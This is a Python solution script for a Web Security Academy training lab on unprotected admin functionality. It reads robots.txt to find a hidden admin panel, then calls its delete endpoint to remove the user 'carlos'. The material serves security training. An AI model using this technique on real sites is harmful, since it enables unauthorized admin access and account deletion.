# Lab: Unprotected admin functionality
# difficulty: apprentice
import requests
from pwn import log
import re

sub = '0ae000150391aa01807f2b8c00550040'
url = f'https://{sub}.web-security-academy.net'
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit():
    res = requests.get(f'{url}/robots.txt')
    # Disallow: /administrator-panel
    admin_panel = re.findall(r'Disallow: (.*)', res.text)[0]
    log.info('admin panel at :%s', admin_panel)

    res = requests.get(f'{url}{admin_panel}/delete?username=carlos')
    if res.status_code != 200:
        log.error('failed to delete carlos')
        exit(1)
    log.success('carlos deleted')

if __name__ == '__main__':
    exploit()